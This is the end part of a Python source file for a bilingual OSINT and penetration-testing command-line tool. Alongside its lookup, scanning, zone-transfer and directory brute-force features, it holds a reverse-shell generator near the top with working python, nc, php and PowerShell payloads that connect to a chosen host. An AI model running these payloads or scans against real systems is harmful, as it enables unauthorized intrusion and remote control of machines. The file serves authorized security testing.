        "python": f"python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"{host}\",{port}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'",
        "nc": f"nc {host} {port} -e /bin/sh",
        "php": f"php -r '$s=fsockopen(\"{host}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "powershell": f"powershell -NoP -NonI -Command \"$client=New-Object System.Net.Sockets.TCPClient('{host}',{port});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){{$data=(New-Object Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendbyte=([Text.Encoding]::ASCII).GetBytes($sendback+'PS '+(pwd).Path+'> ');$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
    }
    if shell_type not in payloads:
        return {"error": t("invalid_target")}
    return {"type": shell_type, "lhost": host, "lport": port, "payload": payloads[shell_type]}


def google_dork(query):
    return f"https://www.google.com/search?q={urllib.parse.quote_plus(query)}"


def pastebin_search(keyword):
    keyword = keyword.strip()
    if not keyword:
        return {"results": [], "error": t("invalid_target")}
    fallback = google_dork(f"site:pastebin.com {keyword}")
    try:
        response = http_request(f"https://psbdmp.ws/api/v3/search/{urllib.parse.quote(keyword, safe='')}", timeout=12)
        data = response_json(response)
        if response["status"] == 200 and isinstance(data, dict):
            items = data.get("data", [])
            results = []
            for item in items[:20]:
                paste_id = item.get("id")
                if paste_id:
                    results.append({
                        "id": paste_id,
                        "title": item.get("title") or paste_id,
                        "date": item.get("date"),
                        "url": f"https://pastebin.com/{paste_id}",
                    })
            return {"results": results, "fallback_search": fallback}
        return {"results": [], "error": f"HTTP {response['status']}", "fallback_search": fallback}
    except Exception as exc:
        return {"results": [], "error": str(exc), "fallback_search": fallback}


def valid_hash(value):
    return bool(re.fullmatch(r"(?:[A-Fa-f0-9]{32}|[A-Fa-f0-9]{40}|[A-Fa-f0-9]{64})", value))


def virustotal_hash(hash_value, apikeys):
    if not valid_hash(hash_value):
        return {"error": t("invalid_hash")}
    key = apikeys.get("virustotal")
    if not key:
        return {"error": bi("No VirusTotal API key is configured.", "Δεν έχει ρυθμιστεί VirusTotal API key.")}
    try:
        response = http_request(
            f"https://www.virustotal.com/api/v3/files/{hash_value.lower()}",
            headers={"x-apikey": key, "Accept": "application/json"},
            timeout=15,
        )
        data = response_json(response)
        if response["status"] == 200 and isinstance(data, dict):
            return data
        return {"error": f"HTTP {response['status']}", "details": data or response["text"][:500]}
    except Exception as exc:
        return {"error": str(exc)}


def shodan_lookup(target, apikeys):
    key = apikeys.get("shodan")
    if not key:
        return {"error": bi("No Shodan API key is configured.", "Δεν έχει ρυθμιστεί Shodan API key.")}
    host, ip = resolve_target(target)
    if not ip:
        return {"error": t("invalid_target")}
    try:
        response = http_request(
            f"https://api.shodan.io/shodan/host/{urllib.parse.quote(ip, safe='')}?key={urllib.parse.quote(key, safe='')}",
            timeout=15,
        )
        data = response_json(response)
        if response["status"] == 200 and isinstance(data, dict):
            return data
        return {"error": f"HTTP {response['status']}", "details": data or response["text"][:500], "resolved_from": host}
    except Exception as exc:
        return {"error": str(exc)}


def censys_lookup(target, apikeys):
    host, ip = resolve_target(target)
    if not ip:
        return {"error": t("invalid_target")}
    pat = apikeys.get("censys_pat")
    organization = apikeys.get("censys_org")
    if pat:
        headers = {
            "Authorization": f"Bearer {pat}",
            "Accept": "application/vnd.censys.api.v3.host.v1+json",
        }
        if organization:
            headers["X-Organization-ID"] = organization
        try:
            response = http_request(
                f"https://api.platform.censys.io/v3/global/asset/host/{urllib.parse.quote(ip, safe='')}",
                headers=headers,
                timeout=20,
            )
            data = response_json(response)
            if response["status"] == 200 and isinstance(data, dict):
                return data
            return {"error": f"HTTP {response['status']}", "details": data or response["text"][:500], "resolved_from": host}
        except Exception as exc:
            return {"error": str(exc)}
    legacy_id = apikeys.get("censys_id")
    legacy_secret = apikeys.get("censys_secret")
    if legacy_id and legacy_secret:
        try:
            response = http_request(
                f"https://search.censys.io/api/v2/hosts/{urllib.parse.quote(ip, safe='')}",
                timeout=20,
                auth=(legacy_id, legacy_secret),
            )
            data = response_json(response)
            if response["status"] == 200 and isinstance(data, dict):
                return data
            return {"error": f"HTTP {response['status']}", "details": data or response["text"][:500]}
        except Exception as exc:
            return {"error": str(exc)}
    return {"error": bi("No Censys Personal Access Token is configured.", "Δεν έχει ρυθμιστεί Censys Personal Access Token.")}


def generate_qr(text, output_path=None):
    module = MODULES.get("qrcode")
    if module is None:
        return {"error": t("dependency_unavailable")}
    try:
        if output_path is None:
            REPORT_DIR.mkdir(parents=True, exist_ok=True)
            output_path = REPORT_DIR / f"qrcode_{datetime.datetime.now().strftime('%Y%m%d-%H%M%S')}.png"
        image = module.make(text)
        image.save(str(output_path))
        try:
            os.chmod(output_path, 0o600)
        except OSError:
            pass
        return {"path": str(output_path)}
    except Exception as exc:
        return {"error": str(exc)}


def phone_lookup(number):
    module = MODULES.get("phonenumbers")
    if module is None:
        compact = re.sub(r"[\s().-]", "", number)
        if compact.startswith("00"):
            compact = "+" + compact[2:]
        if not compact.startswith("+") and compact.isdigit():
            compact = "+30" + compact.lstrip("0")
        possible = bool(re.fullmatch(r"\+[1-9]\d{7,14}", compact))
        return {
            "valid": False,
            "possible": possible,
            "normalized": compact if possible else number,
            "region": None,
            "carrier": None,
            "timezones": [],
            "type": "unknown",
            "limited": True,
        }
    try:
        parsed = module.parse(number, "GR" if not number.strip().startswith("+") else None)
        number_type = module.number_type(parsed)
        labels = {
            module.PhoneNumberType.MOBILE: "mobile",
            module.PhoneNumberType.FIXED_LINE: "fixed",
            module.PhoneNumberType.FIXED_LINE_OR_MOBILE: "fixed_or_mobile",
            module.PhoneNumberType.VOIP: "voip",
            module.PhoneNumberType.TOLL_FREE: "toll_free",
            module.PhoneNumberType.PREMIUM_RATE: "premium_rate",
        }
        geocoder_module = MODULES.get("phone_geocoder")
        carrier_module = MODULES.get("phone_carrier")
        timezone_module = MODULES.get("phone_timezone")
        return {
            "valid": module.is_valid_number(parsed),
            "possible": module.is_possible_number(parsed),
            "normalized": module.format_number(parsed, module.PhoneNumberFormat.E164),
            "region": geocoder_module.description_for_number(parsed, "el" if LANG == "gr" else "en") if geocoder_module else None,
            "carrier": carrier_module.name_for_number(parsed, "el" if LANG == "gr" else "en") if carrier_module else None,
            "timezones": list(timezone_module.time_zones_for_number(parsed)) if timezone_module else [],
            "type": labels.get(number_type, "other"),
            "limited": False,
        }
    except Exception as exc:
        return {"error": str(exc)}


def pause():
    try:
        input(t("press_enter"))
    except (EOFError, KeyboardInterrupt):
        pass


def print_json(data):
    print(json.dumps(data, ensure_ascii=False, indent=2, default=str))


def print_geo(geo, interactive=True):
    if "error" in geo:
        print(f"{bi('Error', 'Σφάλμα')}: {geo['error']}")
        return
    address = ipaddress.ip_address(geo["ip"])
    print(f"{t('type')}: {t('public') if address.is_global else t('private')}")
    if not address.is_global:
        return
    for key in ("country", "region", "city", "isp", "asn", "timezone", "coordinates"):
        if geo.get(key):
            print(f"{t(key)}: {geo[key]}")
    coordinates = geo.get("coordinates") or (None, None)
    if interactive and all(value is not None for value in coordinates):
        try:
            choice = input(t("map_prompt")).strip().lower()
        except EOFError:
            choice = ""
        if choice in {"y", "yes", "ν", "ναι"}:
            latitude, longitude = coordinates
            url = f"https://www.openstreetmap.org/?mlat={latitude}&mlon={longitude}#map=12/{latitude}/{longitude}"
            print(url)
            try:
                webbrowser.open(url)
            except Exception:
                pass


def print_dns(data):
    labels = {
        "A": t("ipv4"),
        "AAAA": t("ipv6"),
        "MX": t("mx"),
        "NS": t("ns"),
        "TXT": t("txt"),
        "SOA": t("soa"),
        "CNAME": t("cname"),
        "PTR": t("reverse"),
    }
    for record_type in ["A", "AAAA", "MX", "NS", "TXT", "SOA", "CNAME", "PTR"]:
        values = data.get(record_type, [])
        print(f"{labels[record_type]}: {', '.join(values) if values else t('no_records')}")


def authorization_prompt():
    try:
        value = input(t("authorization_active")).strip().upper()
    except EOFError:
        return False
    return value in {"YES", "ΝΑΙ"}


def interactive_menu(config):
    load_dependencies(auto_install=True)
    while True:
        try:
            choice = input(t("menu")).strip()
        except (EOFError, KeyboardInterrupt):
            print("\n" + t("goodbye"))
            return
        handlers = {
            "1": ip_menu,
            "2": domain_osint,
            "3": email_osint,
            "4": phone_osint,
            "5": username_osint,
            "6": mac_osint,
            "7": asn_osint,
            "8": dork_menu,
            "9": pastebin_menu,
            "10": ssl_analysis_menu,
            "11": headers_audit_menu,
            "12": port_scan_menu,
            "13": zone_transfer_menu,
            "14": dirb_menu,
            "15": web_tech_menu,
            "16": reverse_shell_menu,
            "17": metadata_menu,
            "18": vt_hash_menu,
            "19": shodan_menu,
            "20": censys_menu,
            "21": qr_menu,
            "22": lambda _: view_reports(),
            "23": settings_menu,
            "24": lambda _: apikey_menu(),
        }
        if choice == "0":
            print(t("goodbye"))
            return
        handler = handlers.get(choice)
        if handler:
            handler(config)
        else:
            print(t("invalid"))


def ip_menu(config):
    while True:
        try:
            choice = input(t("ip_menu")).strip()
        except (EOFError, KeyboardInterrupt):
            return
        if choice == "0":
            return
        if choice == "1":
            try:
                ip = own_public_ip()
                print(f"{t('public_ip')}: {ip}")
                geo = geoip_lookup(ip)
                print_geo(geo)
                path = save_report("ip_my", ip, {"geo": geo, "rdap": rdap_lookup(ip)})
                print(f"{t('saved')} {path}")
            except Exception as exc:
                print(f"{bi('Error', 'Σφάλμα')}: {exc}")
        elif choice == "2":
            target = input(t("target")).strip()
            host, ip = resolve_target(target)
            if not ip:
                print(t("invalid_target"))
            else:
                geo = geoip_lookup(ip)
                rdap = rdap_lookup(ip)
                whois_data = {} if is_ip(host) else whois_lookup(host)
                print(f"{t('resolved_ip')}: {ip}")
                print_geo(geo)
                print("\n--- RDAP ---")
                print_json(rdap)
                if whois_data:
                    print("\n--- WHOIS ---")
                    print_json(whois_data)
                path = save_report("ip_lookup", host, {"ip": ip, "geo": geo, "rdap": rdap, "whois": whois_data})
                print(f"{t('saved')} {path}")
        elif choice == "3":
            target = input(t("target")).strip()
            _, ip = resolve_target(target)
            if not ip:
                print(t("invalid_target"))
            else:
                domains = reverse_ip(ip)
                if domains:
                    for domain in domains:
                        print(domain)
                else:
                    print(t("no_records"))
                path = save_report("reverse_ip", ip, domains)
                print(f"{t('saved')} {path}")
        else:
            print(t("invalid"))
        pause()


def domain_osint(config):
    domain = normalize_host(input(t("domain")).strip())
    if not domain:
        print(t("invalid_target"))
        return
    print(t("working"))
    dns_data = dns_enum(domain)
    print("\n--- DNS ---")
    print_dns(dns_data)
    whois_data = whois_lookup(domain)
    print("\n--- WHOIS / RDAP ---")
    print_json(whois_data)
    subdomains = subdomain_crtsh(domain)
    print("\n--- crt.sh ---")
    if subdomains:
        for item in subdomains:
            print(item)
    else:
        print(t("no_subdomains"))
    ssl_data = ssl_cert_analysis(domain)
    headers_data = headers_audit(f"https://{domain}")
    path = save_report("domain", domain, {
        "dns": dns_data,
        "whois": whois_data,
        "subdomains": subdomains,
        "tls": ssl_data,
        "headers": headers_data,
    })
    print(f"{t('saved')} {path}")
    pause()


def email_osint(config):
    email = input(t("email")).strip()
    valid, mx = email_check(email)
    if not valid:
        print(t("email_invalid_format"))
        pause()
        return
    print(t("email_valid_format"))
    print(t("email_mx_ok") if mx else t("email_mx_missing"))
    breach = email_breach_check(email, load_apikeys())
    if breach.get("error"):
        print(breach["error"])
    elif breach.get("breaches"):
        print(t("email_breach"))
        for item in breach["breaches"]:
            print(f"  {item.get('Name')}: {item.get('BreachDate')} ({item.get('Domain')})")
    else:
        print(t("email_breach_clean"))
    active = None
    try:
        choice = input(bi("Run authorized SMTP VRFY check? [y/N]: ", "Εκτέλεση εξουσιοδοτημένου SMTP VRFY; [ν/Ο]: ")).strip().lower()
    except EOFError:
        choice = ""
    if choice in {"y", "yes", "ν", "ναι"}:
        print(t("smtp_notice"))
        if authorization_prompt():
            active = email_smtp_verify(email)
            print_json(active)
    path = save_report("email", email, {"valid": valid, "mx": mx, "hibp": breach, "smtp": active})
    print(f"{t('saved')} {path}")
    pause()


def phone_osint(config):
    number = input(t("phone")).strip()
    result = phone_lookup(number)
    if result.get("error"):
        print(result["error"])
    else:
        status = t("phone_valid") if result["valid"] else t("phone_possible") if result["possible"] else t("phone_invalid")
        print(status)
        print(f"{t('normalized')}: {result['normalized']}")
        print(f"{t('phone_region')}: {result.get('region') or t('unknown')}")
        print(f"{t('carrier')}: {result.get('carrier') or t('unknown')}")
        print(f"{t('phone_timezone')}: {', '.join(result.get('timezones', [])) or t('unknown')}")
        print(f"{t('phone_type')}: {result.get('type')}")
        path = save_report("phone", number, result)
        print(f"{t('saved')} {path}")
    pause()


def username_osint(config):
    username = input(t("username")).strip()
    print(t("username_checking"))
    found = username_search(username)
    if found:
        print(t("username_found"))
        for item in found:
            print(f"  {item['platform']}: {item['url']}")
    else:
        print(t("username_not_found"))
    path = save_report("username", username, {"found": found, "warning": bi("Results are indicators and may include false positives.", "Τα αποτελέσματα είναι ενδείξεις και μπορεί να περιέχουν false positives.")})
    print(f"{t('saved')} {path}")
    pause()


def mac_osint(config):
    value = input(t("mac")).strip()
    result = mac_lookup(value)
    if result.get("error"):
        print(result["error"])
    else:
        print(f"{t('mac_address')}: {result['mac']}")
        print(f"{t('mac_vendor')}: {result['vendor']}")
        path = save_report("mac", result["mac"], result)
        print(f"{t('saved')} {path}")
    pause()


def asn_osint(config):
    query = input(t("asn_input")).strip()
    result = asn_lookup(query)
    print_json(result)
    path = save_report("asn", query, result)
    print(f"{t('saved')} {path}")
    pause()


def dork_menu(config):
    query = input(t("dork_query")).strip()
    if query:
        link = google_dork(query)
        print(f"{t('dork_result')} {link}")
        path = save_report("dork", query[:50], {"query": query, "link": link})
        print(f"{t('saved')} {path}")
    pause()


def pastebin_menu(config):
    keyword = input(t("pastebin_keyword")).strip()
    result = pastebin_search(keyword)
    if result["results"]:
        print(t("pastebin_results"))
        for item in result["results"]:
            print(f"  {item['title']} - {item['url']}")
    else:
        print(t("pastebin_no_results"))
        if result.get("error"):
            print(result["error"])
    print(f"{bi('Fallback search', 'Εναλλακτική αναζήτηση')}: {result.get('fallback_search')}")
    path = save_report("pastebin", keyword, result)
    print(f"{t('saved')} {path}")
    pause()


def ssl_analysis_menu(config):
    target = input(t("ssl_target")).strip()
    result = ssl_cert_analysis(target)
    print_json(result)
    path = save_report("ssl", target, result)
    print(f"{t('saved')} {path}")
    pause()


def headers_audit_menu(config):
    url = input(t("headers_target")).strip()
    result = headers_audit(url)
    print_json(result)
    path = save_report("headers", url, result)
    print(f"{t('saved')} {path}")
    pause()


def port_scan_menu(config):
    target = input(t("scan_target")).strip()
    host, ip = resolve_target(target)
    if not ip:
        print(t("invalid_target"))
        return
    choice = input(t("scan_presets")).strip()
    try:
        ports = PORT_PRESETS.get(choice) or parse_ports(input(t("custom_ports")).strip())
    except ValueError as exc:
        print(exc)
        return
    if not authorization_prompt():
        print(t("not_authorized"))
        return
    result = port_scan(ip, ports, grab_banner=True)
    open_items = {port: data for port, data in result.items() if data["open"]}
    if open_items:
        print(t("open_ports"))
        for port, data in sorted(open_items.items()):
            line = f"  {port}/tcp"
            if data["banner"]:
                line += f" - {data['banner'][:120]}"
            print(line)
    else:
        print(t("none_open"))
    path = save_report("portscan", host, {"resolved_ip": ip, "ports": ports, "results": result})
    print(f"{t('saved')} {path}")
    pause()


def zone_transfer_menu(config):
    domain = normalize_host(input(t("domain")).strip())
    if not domain:
        print(t("invalid_target"))
        return
    if not authorization_prompt():
        print(t("not_authorized"))
        return
    result = zone_transfer(domain)
    if result.get("records"):
        print(t("zone_transfer_ok"))
        for record in result["records"]:
            print(record)
    else:
        print(f"{t('zone_transfer_fail')} {result.get('error', '')}")
    path = save_report("zone_transfer", domain, result)
    print(f"{t('saved')} {path}")
    pause()


def dirb_menu(config):
    url = input(t("tech_target")).strip()
    if not authorization_prompt():
        print(t("not_authorized"))
        return
    wordlist = input(t("dirb_wordlist")).strip()
    result = dir_brute(url, wordlist)
    if result.get("error"):
        print(result["error"])
    elif result["found"]:
        print(t("dirb_found"))
        for item in result["found"]:
            print(f"  {item['status']} {item['url']}")
    else:
        print(t("no_dirs"))
    path = save_report("dirb", url, result)
    print(f"{t('saved')} {path}")
    pause()


def web_tech_menu(config):
    url = input(t("tech_target")).strip()
    result = tech_fingerprint(url)
    print_json(result)
    path = save_report("webtech", url, result)
    print(f"{t('saved')} {path}")
    pause()


def reverse_shell_menu(config):
    print(t("reverse_notice"))
    if not authorization_prompt():
        print(t("not_authorized"))
        return
    mapping = {"1": "bash", "2": "python", "3": "nc", "4": "php", "5": "powershell"}
    shell_type = mapping.get(input(t("reverse_menu")).strip())
    if not shell_type:
        print(t("invalid"))
        return
    result = reverse_shell(input(t("lhost")).strip(), input(t("lport")).strip(), shell_type)
    print_json(result)
    pause()


def metadata_menu(config):
    path_value = input(t("metadata_file")).strip()
    result = extract_metadata(path_value)
    print_json(result)
    path = save_report("metadata", pathlib.Path(path_value).name or "file", result)
    print(f"{t('saved')} {path}")
    pause()


def api_lookup_menu(prompt_key, kind, function):
    target = input(t(prompt_key)).strip()
    result = function(target, load_apikeys())
    print_json(result)
    path = save_report(kind, target, result)
    print(f"{t('saved')} {path}")
    pause()


def vt_hash_menu(config):
    api_lookup_menu("vt_hash", "vt_hash", virustotal_hash)


def shodan_menu(config):
    api_lookup_menu("shodan_target", "shodan", shodan_lookup)


def censys_menu(config):
    api_lookup_menu("censys_target", "censys", censys_lookup)


def qr_menu(config):
    value = input(t("qr_text")).strip()
    result = generate_qr(value)
    print_json(result)
    pause()


def view_reports():
    reports = sorted(REPORT_DIR.glob("*.json"), reverse=True) if REPORT_DIR.is_dir() else []
    if not reports:
        print(t("reports_empty"))
        return
    print(f"\n{t('reports_title')}:")
    for index, report in enumerate(reports, 1):
        print(f"  [{index}] {report.name}")
    action = input(t("report_action")).strip()
    if action.upper() == "D":
        number = input(t("delete_number")).strip()
        if number.isdigit() and 1 <= int(number) <= len(reports):
            reports[int(number) - 1].unlink()
            print(t("deleted"))
    elif action.isdigit() and 1 <= int(action) <= len(reports):
        path = reports[int(action) - 1]
        try:
            print(f"\n--- {path.name} ---")
            print(path.read_text(encoding="utf-8"))
        except OSError as exc:
            print(f"{t('report_read_error')} {exc}")
    pause()


def settings_menu(config):
    while True:
        choice = input(t("settings")).strip()
        if choice == "1":
            selected = input("[1] English\n[2] Ελληνικά\n> ").strip()
            choose_language(config, forced="gr" if selected == "2" else "en")
            print(t("language_changed"))
        elif choice == "2":
            print(t("storage").format(config=CONFIG_FILE, reports=REPORT_DIR))
        elif choice == "3":
            confirm = input(t("confirm_delete_all")).strip().upper()
            if confirm in {"DELETE", "ΔΙΑΓΡΑΦΗ"}:
                if REPORT_DIR.is_dir():
                    for path in REPORT_DIR.iterdir():
                        if path.is_file() and path.suffix in {".json", ".png"}:
                            path.unlink()
                print(t("all_deleted"))
        elif choice == "4":
            self_test()
        elif choice == "5":
            doctor(auto_install=False)
        elif choice == "0":
            return
        else:
            print(t("invalid"))


def prompt_secret(label):
    try:
        return getpass.getpass(label).strip()
    except (EOFError, KeyboardInterrupt):
        return ""


def normalize_service(service):
    aliases = {
        "vt": "virustotal",
        "virus-total": "virustotal",
        "haveibeenpwned": "hibp",
        "censys": "censys_pat",
        "censys-pat": "censys_pat",
        "censys-org": "censys_org",
        "censys-organization": "censys_org",
    }
    return aliases.get(service.lower(), service.lower())


def set_api_value(service, value=None):
    service = normalize_service(service)
    allowed = {"shodan", "virustotal", "hibp", "censys_pat", "censys_org"}
    if service not in allowed:
        return False
    if value is None:
        value = prompt_secret(f"{service}: ")
    if not value:
        return False
    data = load_apikeys()
    data[service] = value
    save_apikeys(data)
    return True


def remove_api_value(service):
    service = normalize_service(service)
    data = load_apikeys()
    if service not in data:
        return False
    data.pop(service, None)
    save_apikeys(data)
    return True


def masked_api_values():
    data = load_apikeys()
    masked = {}
    for key, value in sorted(data.items()):
        text = str(value)
        masked[key] = text[:4] + "..." + text[-4:] if len(text) > 10 else "****"
    return masked


def apikey_menu():
    while True:
        choice = input(t("apikey_menu")).strip()
        services = {"1": "shodan", "2": "virustotal", "3": "hibp", "4": "censys_pat", "5": "censys_org"}
        if choice in services:
            if set_api_value(services[choice]):
                print(t("apikey_set"))
        elif choice == "6":
            print(t("apikey_show"))
            values = masked_api_values()
            if values:
                for key, value in values.items():
                    print(f"  {key}: {value}")
            else:
                print(t("nothing_set"))
        elif choice == "7":
            service = input(t("apikey_service")).strip()
            print(t("api_removed") if remove_api_value(service) else t("nothing_set"))
        elif choice == "0":
            return
        else:
            print(t("invalid"))


def self_test():
    errors = []
    try:
        assert normalize_host("https://example.com/path") == "example.com"
    except Exception as exc:
        errors.append(f"normalize_host: {exc}")
    try:
        assert parse_ports("22,80,100-102") == [22, 80, 100, 101, 102]
        try:
            parse_ports("1-500")
            errors.append("parse_ports limit")
        except ValueError:
            pass
    except Exception as exc:
        errors.append(f"parse_ports: {exc}")
    server = None
    thread = None
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind(("127.0.0.1", 0))
        server.listen(1)
        port = server.getsockname()[1]
        def accept_once():
            try:
                connection, _ = server.accept()
                connection.sendall(b"CHAKRAVYUH TEST\r\n")
                connection.close()
            except OSError:
                pass
        thread = threading.Thread(target=accept_once, daemon=True)
        thread.start()
        result = port_scan("127.0.0.1", [port], timeout=1, grab_banner=True)
        assert result[port]["open"]
    except Exception as exc:
        errors.append(f"port_scan: {exc}")
    finally:
        if server:
            server.close()
        if thread:
            thread.join(timeout=1)
    try:
        with tempfile.TemporaryDirectory() as temp_dir:
            original = os.environ.get("CHAKRAVYUH_REPORT_DIR")
            test_path = pathlib.Path(temp_dir) / "test.json"
            test_path.write_text(json.dumps({"ok": True}), encoding="utf-8")
            assert json.loads(test_path.read_text(encoding="utf-8"))["ok"]
            if original is not None:
                os.environ["CHAKRAVYUH_REPORT_DIR"] = original
    except Exception as exc:
        errors.append(f"filesystem: {exc}")
    if errors:
        print(f"{t('self_test_fail')} {'; '.join(errors)}")
        return False
    print(t("self_test_ok"))
    print(t("network_test_skipped"))
    return True


def create_parser():
    parser = argparse.ArgumentParser(prog="chakravyuh", add_help=False)
    parser.add_argument("--language", choices=["en", "gr", "el"])
    parser.add_argument("--help", "-h", action="store_true")
    parser.add_argument("--no-install", action="store_true")
    parser.add_argument("--json", action="store_true", dest="json_output")
    parser.add_argument("command", nargs="?")
    parser.add_argument("target", nargs="?")
    parser.add_argument("value", nargs="?")
    parser.add_argument("--ports")
    parser.add_argument("--authorized", action="store_true")
    parser.add_argument("--banner", action="store_true")
    parser.add_argument("--lhost")
    parser.add_argument("--lport")
    parser.add_argument("--type", choices=["bash", "python", "nc", "php", "powershell"])
    parser.add_argument("--wordlist")
    parser.add_argument("--timeout", type=float, default=1.5)
    return parser


def output_result(result, json_output=False):
    if json_output or isinstance(result, (dict, list)):
        print_json(result)
    else:
        print(result)


def active_allowed(args):
    if args.authorized:
        return True
    print(t("cli_auth"))
    return False


def cli_main(args, config):
    command = (args.command or "menu").lower()
    if command in {"help", "-h", "--help"} or args.help:
        print_help(LANG)
        return 0
    if command == "language":
        selected = args.target
        if selected not in {"en", "gr", "el"}:
            print(t("invalid"))
            return 2
        choose_language(config, selected)
        print(t("language_changed"))
        return 0
    if command == "self-test":
        return 0 if self_test() else 1
    if command == "doctor":
        load_dependencies(auto_install=not args.no_install)
        return 0 if doctor(auto_install=False) else 1
    if command == "reports":
        view_reports()
        return 0
    if command == "apikey":
        if not args.target:
            apikey_menu()
            return 0
        if set_api_value(args.target, args.value):
            print(t("apikey_set"))
            return 0
        print(t("invalid"))
        return 2
    if command == "apikey-remove":
        if args.target and remove_api_value(args.target):
            print(t("api_removed"))
            return 0
        print(t("nothing_set"))
        return 2
    load_dependencies(auto_install=not args.no_install)
    if command == "menu":
        interactive_menu(config)
        return 0
    target = args.target
    result = None
    report_kind = command
    report_target = target or "interactive"
    if command == "myip":
        ip = own_public_ip()
        result = {"ip": ip, "geo": geoip_lookup(ip), "rdap": rdap_lookup(ip)}
    elif command == "ip":
        target = target or input(t("target")).strip()
        host, ip = resolve_target(target)
        if not ip:
            result = {"error": t("invalid_target")}
        else:
            result = {"host": host, "ip": ip, "geo": geoip_lookup(ip), "rdap": rdap_lookup(ip), "whois": {} if is_ip(host) else whois_lookup(host)}
        report_target = target
    elif command == "dns":
        target = normalize_host(target or input(t("domain")).strip())
        result = dns_enum(target) if target else {"error": t("invalid_target")}
        report_target = target
    elif command == "subdomain":
        target = normalize_host(target or input(t("domain")).strip())
        result = {"subdomains": subdomain_crtsh(target)} if target else {"error": t("invalid_target")}
        report_target = target
    elif command == "email":
        target = target or input(t("email")).strip()
        valid, mx = email_check(target)
        result = {"valid": valid, "mx": mx, "hibp": email_breach_check(target, load_apikeys()) if valid else {"error": t("invalid_email")}}
        report_target = target
    elif command == "email-verify":
        if not active_allowed(args):
            return 2
        target = target or input(t("email")).strip()
        result = email_smtp_verify(target)
        report_target = target
    elif command == "phone":
        target = target or input(t("phone")).strip()
        result = phone_lookup(target)
        report_target = target
    elif command == "username":
        target = target or input(t("username")).strip()
        result = {"found": username_search(target), "warning": "May contain false positives."}
        report_target = target
    elif command == "mac":
        target = target or input(t("mac")).strip()
        result = mac_lookup(target)
        report_target = target
    elif command == "asn":
        target = target or input(t("asn_input")).strip()
        result = asn_lookup(target)
        report_target = target
    elif command == "ssl":
        target = target or input(t("ssl_target")).strip()
        result = ssl_cert_analysis(target)
        report_target = target
    elif command == "headers":
        target = target or input(t("headers_target")).strip()
        result = headers_audit(target)
        report_target = target
    elif command == "dork":
        target = target or input(t("dork_query")).strip()
        result = {"query": target, "url": google_dork(target)}
        report_target = target[:50]
    elif command == "pastebin":
        target = target or input(t("pastebin_keyword")).strip()
        result = pastebin_search(target)
        report_target = target
    elif command == "scan":
        if not active_allowed(args):
            return 2
        target = target or input(t("scan_target")).strip()
        host, ip = resolve_target(target)
        if not ip:
            result = {"error": t("invalid_target")}
        else:
            try:
                ports = parse_ports(args.ports) if args.ports else PORT_PRESETS["1"]
                result = {"target": host, "resolved_ip": ip, "ports": ports, "results": port_scan(ip, ports, max(0.1, args.timeout), args.banner)}
            except ValueError as exc:
                result = {"error": str(exc)}
        report_target = target
    elif command == "zone-transfer":
        if not active_allowed(args):
            return 2
        target = normalize_host(target or input(t("domain")).strip())
        result = zone_transfer(target) if target else {"error": t("invalid_target")}
        report_target = target
    elif command == "dirb":
        if not active_allowed(args):
            return 2
        target = target or input(t("tech_target")).strip()
        wordlist = args.wordlist or input(t("dirb_wordlist")).strip()
        result = dir_brute(target, wordlist)
        report_target = target
    elif command == "tech":
        target = target or input(t("tech_target")).strip()
        result = tech_fingerprint(target)
        report_target = target
    elif command == "metadata":
        target = target or input(t("metadata_file")).strip()
        result = extract_metadata(target)
        report_target = pathlib.Path(target).name or "file"
    elif command == "vt-hash":
        target = target or input(t("vt_hash")).strip()
        result = virustotal_hash(target, load_apikeys())
        report_target = target
    elif command == "shodan":
        target = target or input(t("shodan_target")).strip()
        result = shodan_lookup(target, load_apikeys())
        report_target = target
    elif command == "censys":
        target = target or input(t("censys_target")).strip()
        result = censys_lookup(target, load_apikeys())
        report_target = target
    elif command == "qr":
        target = target or input(t("qr_text")).strip()
        result = generate_qr(target)
        report_target = "qr"
    elif command == "reverse":
        if not active_allowed(args):
            return 2
        lhost = args.lhost or target or input(t("lhost")).strip()
        lport = args.lport or args.value or input(t("lport")).strip()
        result = reverse_shell(lhost, lport, args.type or "bash")
        report_target = f"{lhost}_{lport}"
    else:
        print(f"{bi('Unknown command', 'Άγνωστη εντολή')}: {command}")
        return 2
    output_result(result, args.json_output)
    if command not in {"qr", "reverse", "dork"} or isinstance(result, dict):
        try:
            path = save_report(report_kind, report_target, result)
            print(f"{t('saved')} {path}", file=sys.stderr if args.json_output else sys.stdout)
        except OSError as exc:
            print(f"{bi('Report error', 'Σφάλμα αναφοράς')}: {exc}", file=sys.stderr)
    return 1 if isinstance(result, dict) and result.get("error") else 0


def main():
    global LANG
    parser = create_parser()
    args = parser.parse_args()
    config = load_config()
    if args.help:
        selected = args.language or config.get("language") or "en"
        LANG = "gr" if selected in {"gr", "el"} else "en"
        print_help(LANG)
        return 0
    choose_language(config, args.language)
    return cli_main(args, config)


if __name__ == "__main__":
    raise SystemExit(main())
PYTHON
